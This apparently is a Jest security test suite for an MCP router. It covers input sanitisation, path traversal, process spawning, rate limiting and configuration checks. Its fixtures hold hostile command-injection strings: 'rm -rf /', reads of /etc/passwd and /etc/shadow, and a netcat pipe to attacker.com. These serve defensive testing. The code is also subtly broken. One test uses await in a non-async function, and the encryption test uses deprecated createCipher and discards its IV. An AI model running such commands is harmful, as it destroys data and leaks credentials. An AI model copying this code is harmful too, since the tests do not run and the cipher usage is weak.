/**
 * AQE Security Validation Tests
 * Comprehensive security testing for MCP Router components
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import { spawn } from 'child_process';

describe('Security Validation Suite', () => {
    describe('Input Sanitization', () => {
        it('should prevent command injection through tool parameters', () => {
            const maliciousInputs = [
                '; rm -rf /',
                '&& cat /etc/passwd',
                '| nc attacker.com 4444',
                '`whoami`',
                '$(cat /etc/shadow)',
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam'
            ];

            maliciousInputs.forEach(input => {
                // Simulate input validation
                const hasCommandInjection = /[;&|`$()\\]/.test(input) || /\.\.\//.test(input);
                expect(hasCommandInjection).toBe(true);

                // Should be rejected or sanitized
                const sanitized = input.replace(/[;&|`$()\\]/g, '').replace(/\.\.\/+/g, '');
                expect(sanitized).not.toMatch(/[;&|`$()\\]/);
            });
        });

        it('should validate JSON-RPC message structure', () => {
            const validMessage = {
                jsonrpc: '2.0',
                id: 1,
                method: 'tools/call',
                params: { name: 'test-tool', arguments: {} }
            };

            const invalidMessages = [
                { jsonrpc: '1.0', id: 1, method: 'test' }, // Wrong version
                { jsonrpc: '2.0', method: 'test' }, // Missing id
                { jsonrpc: '2.0', id: 1 }, // Missing method
                { jsonrpc: '2.0', id: 'string', method: 'test' }, // String id
                null,
                undefined,
                'not-json',
                { __proto__: { isAdmin: true } } // Prototype pollution attempt
            ];

            // Valid message validation
            const isValidMessage = (msg) => {
                return msg &&
                       typeof msg === 'object' &&
                       msg.jsonrpc === '2.0' &&
                       (typeof msg.id === 'number' || typeof msg.id === 'string') &&
                       typeof msg.method === 'string';
            };

            expect(isValidMessage(validMessage)).toBe(true);

            invalidMessages.forEach(msg => {
                expect(isValidMessage(msg)).toBe(false);
            });
        });

        it('should prevent path traversal attacks', () => {
            const pathTraversalAttempts = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/passwd',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
                '..%252f..%252f..%252fetc%252fpasswd' // Double URL encoded
            ];

            pathTraversalAttempts.forEach(path => {
                // Normalize and validate path
                const normalized = path.replace(/[%]/g, '').toLowerCase();
                const hasTraversal = normalized.includes('..') ||
                                   normalized.includes('/etc/') ||
                                   normalized.includes('\\windows\\') ||
                                   normalized.includes('system32');

                expect(hasTraversal).toBe(true);

                // Should be rejected
                const isAllowedPath = !/\.\.|\/etc\/|\\windows\\|system32/i.test(path);
                expect(isAllowedPath).toBe(false);
            });
        });
    });

    describe('Process Security', () => {
        it('should spawn processes with restricted permissions', () => {
            const secureSpawnOptions = {
                stdio: ['pipe', 'pipe', 'pipe'],
                env: {
                    NODE_OPTIONS: '--max-old-space-size=512',
                    // Remove potentially dangerous env vars
                    PATH: process.env.PATH,
                    HOME: undefined,
                    USER: undefined
                },
                uid: process.getuid ? process.getuid() : undefined,
                gid: process.getgid ? process.getgid() : undefined,
                detached: false,
                shell: false // Never use shell for spawning
            };

            // Validate spawn options
            expect(secureSpawnOptions.shell).toBe(false);
            expect(secureSpawnOptions.detached).toBe(false);
            expect(secureSpawnOptions.env.HOME).toBeUndefined();
            expect(secureSpawnOptions.env.NODE_OPTIONS).toBe('--max-old-space-size=512');
        });

        it('should handle process termination gracefully', () => {
            const mockProcess = {
                pid: 1234,
                kill: jest.fn(),
                on: jest.fn(),
                stdin: { write: jest.fn(), end: jest.fn() },
                stdout: { on: jest.fn() },
                stderr: { on: jest.fn() }
            };

            // Graceful shutdown sequence
            const gracefulShutdown = (process) => {
                try {
                    if (process.stdin) {
                        process.stdin.end();
                    }
                    process.kill('SIGTERM');

                    // Force kill after timeout
                    setTimeout(() => {
                        if (process.pid) {
                            process.kill('SIGKILL');
                        }
                    }, 5000);
                } catch (error) {
                    // Process might already be dead
                }
            };

            gracefulShutdown(mockProcess);

            expect(mockProcess.stdin.end).toHaveBeenCalled();
            expect(mockProcess.kill).toHaveBeenCalledWith('SIGTERM');
        });
    });

    describe('Memory Security', () => {
        it('should prevent memory leaks in buffer pools', () => {
            const bufferPool = {
                pool: [],
                maxSize: 20,
                bufferSize: 8192,
                allocated: 0,
                maxAllocated: 100
            };

            const allocateBuffer = () => {
                if (bufferPool.allocated >= bufferPool.maxAllocated) {
                    throw new Error('Memory limit exceeded');
                }

                let buffer;
                if (bufferPool.pool.length > 0) {
                    buffer = bufferPool.pool.pop();
                } else {
                    buffer = Buffer.allocUnsafe(bufferPool.bufferSize);
                    bufferPool.allocated++;
                }

                return buffer;
            };

            const releaseBuffer = (buffer) => {
                if (buffer.length === bufferPool.bufferSize &&
                    bufferPool.pool.length < bufferPool.maxSize) {
                    // Clear sensitive data
                    buffer.fill(0);
                    bufferPool.pool.push(buffer);
                } else {
                    bufferPool.allocated--;
                }
            };

            // Test buffer allocation and release
            const buffer = allocateBuffer();
            expect(buffer).toBeInstanceOf(Buffer);
            expect(bufferPool.allocated).toBe(1);

            releaseBuffer(buffer);
            expect(bufferPool.pool.length).toBe(1);
        });

        it('should clear sensitive data from cache on eviction', () => {
            const sensitiveCache = new Map();
            const maxSize = 3;

            const setSecure = (key, value) => {
                if (sensitiveCache.size >= maxSize) {
                    // Clear old entries before eviction
                    const oldestKey = sensitiveCache.keys().next().value;
                    const oldValue = sensitiveCache.get(oldestKey);

                    // Clear sensitive data
                    if (oldValue && typeof oldValue === 'object') {
                        Object.keys(oldValue).forEach(k => {
                            oldValue[k] = null;
                        });
                    }

                    sensitiveCache.delete(oldestKey);
                }

                sensitiveCache.set(key, value);
            };

            // Fill cache beyond capacity
            setSecure('key1', { secret: 'password1' });
            setSecure('key2', { secret: 'password2' });
            setSecure('key3', { secret: 'password3' });
            setSecure('key4', { secret: 'password4' }); // Should evict key1

            expect(sensitiveCache.size).toBe(3);
            expect(sensitiveCache.has('key1')).toBe(false);
            expect(sensitiveCache.has('key4')).toBe(true);
        });
    });

    describe('Communication Security', () => {
        it('should validate message origins', () => {
            const trustedOrigins = ['localhost', '127.0.0.1', '::1'];

            const validateOrigin = (origin) => {
                return trustedOrigins.includes(origin);
            };

            expect(validateOrigin('localhost')).toBe(true);
            expect(validateOrigin('127.0.0.1')).toBe(true);
            expect(validateOrigin('malicious.com')).toBe(false);
            expect(validateOrigin('192.168.1.100')).toBe(false);
        });

        it('should enforce rate limiting', () => {
            const rateLimiter = {
                requests: new Map(),
                maxRequests: 100,
                windowMs: 60000 // 1 minute
            };

            const checkRateLimit = (clientId) => {
                const now = Date.now();
                const clientRequests = rateLimiter.requests.get(clientId) || [];

                // Remove old requests outside window
                const validRequests = clientRequests.filter(time => now - time < rateLimiter.windowMs);

                if (validRequests.length >= rateLimiter.maxRequests) {
                    return false; // Rate limited
                }

                validRequests.push(now);
                rateLimiter.requests.set(clientId, validRequests);
                return true;
            };

            // Test normal usage
            expect(checkRateLimit('client1')).toBe(true);

            // Test rate limiting
            const client2Requests = Array.from({ length: 101 }, () =>
                checkRateLimit('client2')
            );

            const allowedRequests = client2Requests.filter(allowed => allowed);
            expect(allowedRequests.length).toBe(100);
        });

        it('should sanitize error messages', () => {
            const sanitizeError = (error) => {
                // Remove sensitive information from error messages
                const sensitivePatterns = [
                    /\/[a-zA-Z0-9_\-\/]+\/[a-zA-Z0-9_\-\/]+/g, // file paths
                    /password|secret|key|token/gi, // credentials
                    /\b(?:\d{1,3}\.){3}\d{1,3}\b/g, // IP addresses
                    /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g // email addresses
                ];

                let sanitized = error.toString();
                sensitivePatterns.forEach(pattern => {
                    sanitized = sanitized.replace(pattern, '[REDACTED]');
                });

                return sanitized;
            };

            const sensitiveError = new Error('Database connection failed: password123@localhost:5432/mydb');
            const sanitized = sanitizeError(sensitiveError);

            expect(sanitized).not.toContain('password123');
            expect(sanitized).toContain('[REDACTED]');
        });
    });

    describe('Resource Protection', () => {
        it('should enforce resource limits', () => {
            const resourceLimits = {
                maxMemoryMB: 512,
                maxConcurrentRequests: 50,
                maxToolCalls: 1000,
                currentMemory: 0,
                currentRequests: 0,
                currentToolCalls: 0
            };

            const checkResourceLimits = () => {
                const memoryUsage = process.memoryUsage().heapUsed / 1024 / 1024;

                if (memoryUsage > resourceLimits.maxMemoryMB) {
                    return { allowed: false, reason: 'Memory limit exceeded' };
                }

                if (resourceLimits.currentRequests >= resourceLimits.maxConcurrentRequests) {
                    return { allowed: false, reason: 'Too many concurrent requests' };
                }

                if (resourceLimits.currentToolCalls >= resourceLimits.maxToolCalls) {
                    return { allowed: false, reason: 'Tool call limit exceeded' };
                }

                return { allowed: true };
            };

            const result = checkResourceLimits();
            expect(result.allowed).toBe(true);

            // Test limit enforcement
            resourceLimits.currentRequests = 51;
            const limitedResult = checkResourceLimits();
            expect(limitedResult.allowed).toBe(false);
            expect(limitedResult.reason).toBe('Too many concurrent requests');
        });

        it('should implement circuit breaker pattern', () => {
            const circuitBreaker = {
                failureThreshold: 5,
                resetTimeoutMs: 30000,
                state: 'CLOSED', // CLOSED, OPEN, HALF_OPEN
                failures: 0,
                lastFailureTime: null
            };

            const callWithCircuitBreaker = async (fn) => {
                const now = Date.now();

                // Check if circuit should reset
                if (circuitBreaker.state === 'OPEN' &&
                    now - circuitBreaker.lastFailureTime > circuitBreaker.resetTimeoutMs) {
                    circuitBreaker.state = 'HALF_OPEN';
                    circuitBreaker.failures = 0;
                }

                // Reject if circuit is open
                if (circuitBreaker.state === 'OPEN') {
                    throw new Error('Circuit breaker is OPEN');
                }

                try {
                    const result = await fn();

                    // Reset on success
                    if (circuitBreaker.state === 'HALF_OPEN') {
                        circuitBreaker.state = 'CLOSED';
                    }
                    circuitBreaker.failures = 0;

                    return result;
                } catch (error) {
                    circuitBreaker.failures++;
                    circuitBreaker.lastFailureTime = now;

                    // Open circuit if threshold exceeded
                    if (circuitBreaker.failures >= circuitBreaker.failureThreshold) {
                        circuitBreaker.state = 'OPEN';
                    }

                    throw error;
                }
            };

            // Test circuit breaker functionality
            expect(circuitBreaker.state).toBe('CLOSED');

            // Simulate failures
            for (let i = 0; i < 5; i++) {
                try {
                    await callWithCircuitBreaker(() => {
                        throw new Error('Service failure');
                    });
                } catch (e) {
                    // Expected failures
                }
            }

            expect(circuitBreaker.state).toBe('OPEN');
            expect(circuitBreaker.failures).toBe(5);
        });
    });

    describe('Configuration Security', () => {
        it('should validate configuration schema', () => {
            const validateConfig = (config) => {
                const requiredFields = ['name', 'backendCommand', 'backendArgs'];
                const allowedCommands = ['node', 'python', 'npm', 'npx'];

                // Check required fields
                for (const field of requiredFields) {
                    if (!config[field]) {
                        return { valid: false, error: `Missing required field: ${field}` };
                    }
                }

                // Validate backend command
                if (!allowedCommands.includes(config.backendCommand)) {
                    return { valid: false, error: 'Unauthorized backend command' };
                }

                // Validate arguments
                if (!Array.isArray(config.backendArgs)) {
                    return { valid: false, error: 'backendArgs must be an array' };
                }

                // Check for dangerous arguments
                const dangerousArgs = config.backendArgs.some(arg =>
                    typeof arg === 'string' && /[;&|`$()]/.test(arg)
                );

                if (dangerousArgs) {
                    return { valid: false, error: 'Dangerous characters in arguments' };
                }

                return { valid: true };
            };

            const validConfig = {
                name: 'test-router',
                backendCommand: 'node',
                backendArgs: ['server.js']
            };

            const invalidConfigs = [
                {}, // Missing fields
                { name: 'test', backendCommand: 'rm', backendArgs: ['-rf', '/'] }, // Dangerous command
                { name: 'test', backendCommand: 'node', backendArgs: ['server.js; rm -rf /'] }, // Dangerous args
                { name: 'test', backendCommand: 'node', backendArgs: 'not-array' } // Wrong type
            ];

            expect(validateConfig(validConfig).valid).toBe(true);

            invalidConfigs.forEach(config => {
                expect(validateConfig(config).valid).toBe(false);
            });
        });

        it('should encrypt sensitive configuration data', () => {
            const crypto = require('crypto');
            const algorithm = 'aes-256-cbc';
            const key = crypto.randomBytes(32);

            const encrypt = (text) => {
                const iv = crypto.randomBytes(16);
                const cipher = crypto.createCipher(algorithm, key);
                let encrypted = cipher.update(text, 'utf8', 'hex');
                encrypted += cipher.final('hex');
                return { encrypted, iv: iv.toString('hex') };
            };

            const decrypt = (encryptedData) => {
                const decipher = crypto.createDecipher(algorithm, key);
                let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
                decrypted += decipher.final('utf8');
                return decrypted;
            };

            const sensitiveData = 'api-key-secret-123';
            const encrypted = encrypt(sensitiveData);
            const decrypted = decrypt(encrypted);

            expect(encrypted.encrypted).not.toBe(sensitiveData);
            expect(decrypted).toBe(sensitiveData);
        });
    });
});